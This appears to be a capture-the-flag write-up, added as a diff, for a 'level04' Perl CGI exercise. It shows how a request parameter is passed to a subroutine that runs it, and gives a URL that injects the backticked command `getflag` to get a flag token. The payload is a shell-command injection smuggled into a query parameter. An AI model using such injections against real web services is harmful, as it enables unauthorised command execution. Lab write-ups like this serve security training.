@@ -1,0 +1,10 @@
+Here, we have a perl file called level04.pl
+
+If we look inside, we can see the line "# localhost:4747" and the perl script
+
+We need to go to this page, so: http://192.168.1.65:4747/
+The line "x(param("x"));" will call the x subroutine with the parameter receive by the request.
+So we just have to add ?x=`getflag` at the end of the url :
+http://192.168.1.65:4747/?x=`getflag`
+and we get: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+note: don't forget the ` or the page will just print "getflag"
